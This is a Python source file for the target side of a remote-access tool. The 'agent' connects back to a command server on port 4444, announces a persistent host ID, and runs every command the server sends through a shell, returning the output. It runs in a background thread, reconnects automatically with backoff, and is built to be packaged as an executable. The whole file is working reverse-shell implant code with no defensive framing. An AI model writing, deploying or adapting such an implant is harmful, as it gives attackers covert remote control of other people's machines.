# agent.py — target-side module. Runs the TCP command channel.
#
# Usage in main.py:
#     from agent import Agent
#     Agent(server_host="192.168.122.1", server_port=4444).start()   # non-blocking
#
# Or to block (console-only builds):
#     Agent(server_host="192.168.122.1").run_forever()

from __future__ import annotations

import json
import logging
import os
import platform
import socket
import subprocess
import sys
import threading
import time
import uuid
from pathlib import Path
from typing import Optional

log = logging.getLogger("agent")

MAX_FRAME = 16 * 1024 * 1024


# ---------- framing (must match server) ----------
def send_frame(sock: socket.socket, obj: dict) -> None:
    payload = json.dumps(obj).encode("utf-8")
    sock.sendall(f"{len(payload):08x}\n".encode("ascii") + payload)


def _recv_exact(sock: socket.socket, n: int) -> Optional[bytes]:
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf.extend(chunk)
    return bytes(buf)


def recv_frame(sock: socket.socket) -> Optional[dict]:
    header = _recv_exact(sock, 9)
    if header is None:
        return None
    length = int(header[:8], 16)
    if length > MAX_FRAME:
        raise ValueError(f"frame too large: {length}")
    payload = _recv_exact(sock, length)
    if payload is None:
        return None
    return json.loads(payload.decode("utf-8"))


# ---------- stable host identity ----------
def _id_file_path() -> Path:
    """Where to persist agent.id. Next to the real exe, not MEIPASS."""
    if getattr(sys, "frozen", False):
        return Path(sys.executable).resolve().parent / "agent.id"
    return Path(__file__).resolve().parent / "agent.id"


def resolve_host_id(override: Optional[str] = None) -> str:
    """Return a stable, unique ID for this box.

    Priority:
      1. explicit override (config / CLI)
      2. persisted agent.id file (created once, survives restarts/updates)
      3. platform.node() (OS hostname), persisted for next time
      4. random box-XXXXXX, persisted for next time
    """
    if override:
        return override

    id_file = _id_file_path()
    try:
        if id_file.is_file():
            saved = id_file.read_text(encoding="utf-8").strip()
            if saved:
                return saved
    except OSError as e:
        log.warning("could not read %s: %s", id_file, e)

    candidate = (platform.node() or "").strip()
    if not candidate:
        candidate = f"box-{uuid.uuid4().hex[:6]}"

    try:
        id_file.write_text(candidate + "\n", encoding="utf-8")
        log.info("persisted host id %r to %s", candidate, id_file)
    except OSError as e:
        log.warning("could not write %s: %s", id_file, e)

    return candidate


# ---------- the agent ----------
class Agent:
    def __init__(
        self,
        host_id: Optional[str] = None,
        server_host: str = "192.168.122.1",
        server_port: int = 4444,
        reconnect_min: float = 5.0,
        reconnect_max: float = 300.0,
        connect_timeout: float = 10.0,
        token: Optional[str] = None,
    ):
        self.host_id = resolve_host_id(host_id)
        self.server_host = server_host
        self.server_port = server_port
        self.reconnect_min = reconnect_min
        self.reconnect_max = reconnect_max
        self.connect_timeout = connect_timeout
        self.token = token

        self._sock: Optional[socket.socket] = None
        self._sock_lock = threading.Lock()
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None

    # ---------- lifecycle ----------
    def start(self) -> "Agent":
        """Spawn the connection loop in a daemon thread. Idempotent."""
        if self._thread and self._thread.is_alive():
            return self
        self._stop.clear()
        self._thread = threading.Thread(
            target=self._run, name="agent", daemon=True
        )
        self._thread.start()
        return self

    def stop(self, timeout: float = 3.0) -> None:
        self._stop.set()
        self._close_socket()
        if self._thread:
            self._thread.join(timeout=timeout)

    def run_forever(self) -> None:
        """Block the caller on the connection loop (console builds)."""
        self._run()

    # ---------- internal ----------
    def _run(self) -> None:
        backoff = self.reconnect_min
        while not self._stop.is_set():
            try:
                self._connect_and_serve()
                backoff = self.reconnect_min
            except Exception as e:
                log.warning("agent connection error: %s", e)
            finally:
                self._close_socket()

            if self._stop.is_set():
                break
            delay = backoff * (0.5 + 0.5 * (uuid.uuid4().int % 1000) / 1000)
            log.info("agent reconnecting in %.1fs", delay)
            self._stop.wait(delay)
            backoff = min(backoff * 2, self.reconnect_max)

    def _connect_and_serve(self) -> None:
        sock = socket.create_connection(
            (self.server_host, self.server_port), timeout=self.connect_timeout
        )
        sock.settimeout(None)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        with self._sock_lock:
            self._sock = sock

        try:
            hello = {"type": "hello", "host": self.host_id}
            if self.token:
                hello["token"] = self.token
            send_frame(sock, hello)
            ack = recv_frame(sock)
            if not ack or ack.get("type") != "hello_ok":
                raise ConnectionError("server rejected hello")
            log.info("agent connected as %s", self.host_id)

            while not self._stop.is_set():
                msg = recv_frame(sock)
                if msg is None:
                    log.info("server closed connection")
                    return
                self._handle(msg, sock)
        finally:
            with self._sock_lock:
                self._sock = None

    def _handle(self, msg: dict, sock: socket.socket) -> None:
        mtype = msg.get("type")
        if mtype == "ping":
            send_frame(sock, {"type": "pong", "id": msg.get("id")})
        elif mtype == "cmd":
            cmd_id = msg.get("id")
            cmd = msg.get("cmd", "")
            output = self._execute(cmd)
            send_frame(sock, {"type": "out", "id": cmd_id, "data": output})
        else:
            log.debug("unknown frame type: %s", mtype)

    def _execute(self, cmd: str) -> str:
        try:
            proc = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=60,
            )
            return (proc.stdout or "") + (proc.stderr or "")
        except subprocess.TimeoutExpired:
            return f"[agent] command timed out: {cmd!r}\n"
        except Exception as e:
            return f"[agent] execution error: {e}\n"

    def _close_socket(self) -> None:
        with self._sock_lock:
            s = self._sock
            self._sock = None
        if s is not None:
            try:
                s.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                s.close()
            except OSError:
                pass